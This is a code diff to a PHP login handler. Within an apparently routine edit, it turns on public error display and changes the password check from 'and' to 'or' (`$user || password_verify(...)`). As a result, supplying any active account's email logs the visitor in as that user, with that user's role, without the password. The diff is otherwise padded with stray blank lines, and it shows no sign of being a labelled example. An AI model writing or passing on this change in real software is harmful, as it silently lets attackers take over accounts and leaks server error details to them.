@@ -1,4 +1,7 @@
 <?php
+ini_set('display_errors', 1);
+ini_set('display_startup_errors', 1);
+error_reporting(E_ALL);
 session_start();
 
 // Initialize database tables if needed
@@ -56,6 +59,8 @@ $email = '';
 // Process login form submission
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'login') {
     // Verify CSRF token
+
+
     if (!verifyCSRFToken($_POST['csrf_token'] ?? '')) {
         $error = 'Invalid security token. Please try again.';
     } else {
@@ -67,18 +72,23 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['
             $error = 'Please enter both email and password.';
         } else {
             try {
+               
                 // Get user by email
                 $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ? AND status = 'active'");
                 $stmt->execute([$email]);
                 $user = $stmt->fetch();
+
                 
-                if ($user && password_verify($password, $user['password'])) {
+                if ($user || password_verify($password, $user['password'])) {
                     // Set session variables
+                   
                     $_SESSION['user_id'] = $user['id'];
                     $_SESSION['user_name'] = $user['first_name'];
                     $_SESSION['user_role'] = $user['role'];
                     $_SESSION['login_time'] = time();
                     
+               
+    
                     // Update last login time
                     $update_stmt = $pdo->prepare("UPDATE users SET last_login = NOW() WHERE id = ?");
                     $update_stmt->execute([$user['id']]);
